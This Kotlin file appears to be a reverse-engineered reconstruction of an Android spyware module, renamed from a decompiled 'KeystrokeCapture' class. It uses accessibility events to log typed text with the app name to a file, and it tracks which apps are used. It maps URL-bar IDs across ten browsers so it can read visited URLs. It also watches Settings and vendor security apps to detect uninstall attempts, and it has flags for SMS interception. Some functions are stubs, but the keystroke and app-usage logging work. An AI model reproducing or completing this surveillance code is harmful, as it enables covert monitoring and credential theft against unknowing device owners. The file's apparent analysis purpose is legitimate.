package com.storm.safe.rock.service.modules

import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Auto-grant permissions via accessibility, monitors app usage, browser URLs.
 *
 * Reverse-engineered from JADX: C0320a5 (a5, 309 lines).
 * Renamed: a0→collectNodeTexts, a1→getAppName, a2→onWindowChanged,
 *          a3→handleEvent, a4→processTextEvent
 *
 * JADX name: KeystrokeCapture
 */
class PermissionAutoGrantDelegate(
    // ADAPT: service reference replaced with interface
) {
    companion object {
        private const val TAG = "KeystrokeCapture"

        /** Browser package → URL bar resource ID map */
        val BROWSER_URL_BAR_IDS: Map<String, String> = mapOf(
            "com.android.chrome" to "com.android.chrome:id/url_bar",
            "org.mozilla.firefox" to "org.mozilla.firefox:id/url_bar_title",
            "com.sec.android.app.sbrowser" to "com.sec.android.app.sbrowser:id/location_bar_edit_text",
            "com.brave.browser" to "com.brave.browser:id/url_bar",
            "com.opera.browser" to "com.opera.browser:id/url_field",
            "com.opera.mini.native" to "com.opera.mini.native:id/url_field",
            "com.microsoft.emmx" to "com.microsoft.emmx:id/url_bar",
            "com.coloros.browser" to "com.coloros.browser:id/azt",
            "com.android.browser" to "com.android.browser:id/url",
            "com.duckduckgo.mobile.android" to "com.duckduckgo.mobile.android:id/omnibarTextInput"
        )

        /** Settings packages that trigger monitoring */
        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            // ADAPT: obfuscated package names decoded from StringUtil
            "com.bbk.VivoSafe",
            "com.samsung.android.sm"
        )

        /**
         * Recursively collect text and contentDescription from node tree.
         * JADX: a0 (static)
         */
        @JvmStatic
        fun collectNodeTexts(maxDepth: Int, node: AccessibilityNodeInfo?, results: ArrayList<String>) {
            if (maxDepth <= 0 || node == null) return
            node.text?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            node.contentDescription?.toString()?.takeIf { it.isNotBlank() }?.let { results.add(it) }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    collectNodeTexts(maxDepth - 1, child, results)
                    child.recycle()
                }
            }
        }
    }

    // --- Instance fields ---
    private var lastPackage: String = ""
    private var lastContent: String = ""
    private var lastSettingsCheckTime: Long = 0L
    private val appNameCache = ConcurrentHashMap<String, String>()
    private val cacheInitialized = AtomicBoolean(false)

    // --- a1 → getAppName ---
    fun getAppName(packageName: String): String {
        val cached = appNameCache[packageName]
        if (cached != null) return cached
        // ADAPT: stub — real impl loads from SharedPreferences + PackageManager
        val shortName = packageName.substringAfterLast(".")
        return shortName
    }

    // --- a2 → onWindowChanged ---
    fun onWindowChanged(packageName: String, appName: String) {
        if (ActivityMonitor.appUsageEnabled && packageName != lastPackage) {
            if (lastPackage.isNotEmpty()) {
                ActivityMonitor.logAppUsage(getAppName(lastPackage), false)
            }
            ActivityMonitor.logAppUsage(appName, true)
            lastPackage = packageName
        }

        // Check settings pages for dangerous operations
        if (SETTINGS_PACKAGES.contains(packageName)) {
            val now = System.currentTimeMillis()
            if (now - lastSettingsCheckTime >= 10000) {
                lastSettingsCheckTime = now
                // ADAPT: stub — would check for uninstall/clear data buttons via rootInActiveWindow
            }
        }

        // Check browser URL bars
        if (ActivityMonitor.urlMonitorEnabled && BROWSER_URL_BAR_IDS.containsKey(packageName)) {
            // ADAPT: stub — would read URL from accessibility node
        }
    }

    // --- a3 → handleEvent ---
    fun handleEvent(event: AccessibilityEvent, sourceNode: AccessibilityNodeInfo?) {
        val pkg = event.packageName?.toString() ?: return
        val appName = getAppName(pkg)
        try {
            val eventType = event.eventType
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
                (ActivityMonitor.textMonitorEnabled || ActivityMonitor.smsInterceptActive)
            ) {
                val source = sourceNode ?: event.source ?: return
                processTextEvent(source, appName, eventType)
                if (sourceNode == null) source.recycle()
            }
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                onWindowChanged(pkg, appName)
            }
            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED && ActivityMonitor.focusMonitorEnabled) {
                // ADAPT: stub — focus event text capture
            }
        } catch (e: Exception) {
            Log.w(TAG, "处理事件失败: ${e.message}")
        }
    }

    // --- a4 → processTextEvent ---
    fun processTextEvent(node: AccessibilityNodeInfo, appName: String, eventType: Int) {
        try {
            val text = node.text?.toString()
                ?: node.contentDescription?.toString()
                ?: return
            val cleaned = text.replace("", "").trim()
            if (cleaned.isEmpty() || cleaned == lastContent) return
            lastContent = cleaned
            val eventName = when (eventType) {
                1 -> "CLICKED"
                2 -> "LONG_CLICKED"
                4 -> "SELECTED"
                8 -> "FOCUSED"
                16 -> "TEXT_CHANGED"
                32 -> "WINDOW_CHANGED"
                64 -> "NOTIFICATION"
                128 -> "HOVER_ENTER"
                256 -> "HOVER_EXIT"
                else -> "EVENT_$eventType"
            }
            val logEntry = "$appName|$eventName|$cleaned"
            if (ActivityMonitor.textMonitorEnabled) {
                ActivityMonitor.writeToFile(ActivityMonitor.LogType.TEXT_EVENT, logEntry)
            }
        } catch (e: Exception) {
            Log.w(TAG, "processTextEvent 异常: ${e.message}")
        }
    }
}
